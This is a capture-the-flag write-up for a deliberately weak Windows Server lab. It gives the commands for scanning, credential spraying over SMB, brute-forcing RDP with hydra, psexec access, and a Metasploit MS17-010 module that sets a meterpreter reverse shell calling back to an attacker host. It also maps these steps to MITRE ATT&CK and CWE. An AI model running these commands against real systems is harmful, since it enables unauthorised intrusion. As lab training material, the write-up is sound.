# Maq147: Windows Server Fraquinho

Writeup for the **Windows Server Fraquinho** challenge on [SEC4US](https://sec4us.com.br/).

> **Category:** Hacking: Easy
> **Difficulty:** Easy
> **Points:** 147

---

## Overview

"Fraquinho" means "weak" in Portuguese. This Windows Server has intentionally weak configurations: default credentials, unpatched services, or misconfigured access controls.

## Reconnaissance

```bash
nmap -sV -sC -p- [TARGET_IP] -oN nmap_scan.txt
```

Common findings: SMB (445), RDP (3389), HTTP/IIS, MSRPC (135). Check for weak SMB credentials:

```bash
crackmapexec smb [TARGET_IP] -u Administrator -p '' --shares
crackmapexec smb [TARGET_IP] -u users.txt -p passwords.txt
```

## Exploitation

**Weak credentials approach:**

```bash
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://[TARGET_IP]
```

**SMB with discovered credentials:**

```bash
psexec.py [DOMAIN]/[USER]:[PASSWORD]@[TARGET_IP]
```

**If unpatched, try known exploits:**

```bash
msfconsole -q
use exploit/windows/smb/ms17_010_psexec
set RHOSTS [TARGET_IP]
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST [ATTACKER_IP]
run
```

## Post-Exploitation

Enumerate users, dump hashes, and search for the flag:

```
net user
dir /s /b C:\flag*
type C:\Users\Administrator\Desktop\[FLAG_FILE]
```

## Security Framework Mapping

### MITRE ATT&CK

| Technique | ID |
|-----------|----|
| Brute Force: Password Guessing | T1110.001 |
| Valid Accounts: Default Accounts | T1078.001 |
| Remote Services: Remote Desktop Protocol | T1021.001 |

### CWE

- **CWE-521:** Weak Password Requirements
- **CWE-798:** Use of Hard-coded Credentials

---

A server named "weak" is both a warning and a confession. In the real world, the ones that are just as fragile rarely have the honesty to say so.

```
(❍ᴥ❍ʋ)
```

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
